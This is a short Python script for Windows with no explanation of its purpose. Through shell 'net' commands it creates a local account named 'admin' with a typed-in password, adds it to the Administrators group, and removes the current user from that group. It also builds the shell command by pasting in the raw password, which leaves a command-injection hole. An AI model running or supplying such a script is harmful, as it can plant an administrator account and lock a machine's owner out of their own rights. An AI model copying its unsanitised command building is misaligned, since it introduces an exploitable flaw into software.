import os
import getpass

user = getpass.getuser()
psw = input("password: ")

os.system("net user /add admin " + psw)
os.system(" net localgroup Administrators \"admin\" /add")
os.system("net localgroup Administrators \"" + user + "\" /delete")

input()